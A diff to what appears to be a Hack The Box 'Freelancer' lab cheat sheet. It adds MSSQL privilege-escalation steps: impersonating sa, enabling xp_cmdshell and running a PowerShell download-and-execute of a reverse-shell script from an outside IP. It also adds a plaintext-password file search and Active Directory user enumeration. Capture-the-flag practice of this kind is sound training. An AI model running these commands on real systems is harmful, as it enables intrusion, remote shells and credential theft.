@@ -13,5 +13,46 @@ printf "%d" 2 | base64
 #use scanqr code to get link content
 echo "http://freelancer.htb/accounts/login/otp/Mg==/43c1fd8315d35368f280e7298fdab3a8/"
 ==========(6)======================================================================================================================
+#Enumerate what type of SQL server we're interacting
+SELECT @@SERVERNAME;
+
+#Query current user, system roles and whether or not we are currently a system administrator.
+(1) SELECT SYSTEM_USER;
+(2) SELECT name,roles FROM sysusers WHERE issqluser = '1'
+(3) SELECT is_srvrolemember('sysadmin');
+
+#Query if we've been granted privileges that we might be able to leverage. 
+(1) SELECT name, principal_id FROM sys.server_principals WHERE name = 'Freelancer_webapp_user'
+(2) SELECT grantee_principal_id, permission_name, grantor_principal_id FROM sys.server_permissions WHERE grantee_principal_id = '267';
+
+#Impersonate sa and take full control over the SQL service. 
+SELECT a.name AS grantee, b.permission_name, c.name AS grantor FROM sys.server_permissions b INNER JOIN sys.server_principals a ON b.grantee_principal_id = a.principal_id
+INNER JOIN sys.server_principals c ON b.grantor_principal_id = c.principal_id WHERE b.permission_name = 'IMPERSONATE';
+
+#Validate our findings before proceeding
+EXECUTE AS LOGIN = 'sa';
+SELECT is_srvrolemember('sysadmin');
+
+#Enable xp_cmdshell and run command
+#(May have to run enabling and executing command immediately followed by one another in some systems. May use EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell "whoami"; to verify code execution in other systems)
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)";
+==========(7)======================================================================================================================
+#find password stored in in plaintext in any files
+(gci: Alias for Get-ChildItem)
+gci -path .*.txt,*.ini,*.yml,*.xml,*.ps1,*-recurse -ea SilentlyContinue -Include .cfg | select-string -pattern "password\s*[:=]\s*\S+" -CaseSensitive:$false
+
+#get list of all active directory users
+get-aduser -filter * | select samaccountname
+  (a) get-aduser -filter * -properties DisplayName, EmailAddress | select samaccountname, DisplayName, EmailAddress
+  (b) get-aduser -filter "Name -like '*John*'" | select samaccountname
+  (c) get-aduser -filter * | select samaccountname | Export-Csv -Path "ADUsers.csv" -NoTypeInformation
+
+==========(8)======================================================================================================================
 See https://github.com/ajiththomas/passwordspray/blob/main/spray.c
 ==========(7)======================================================================================================================
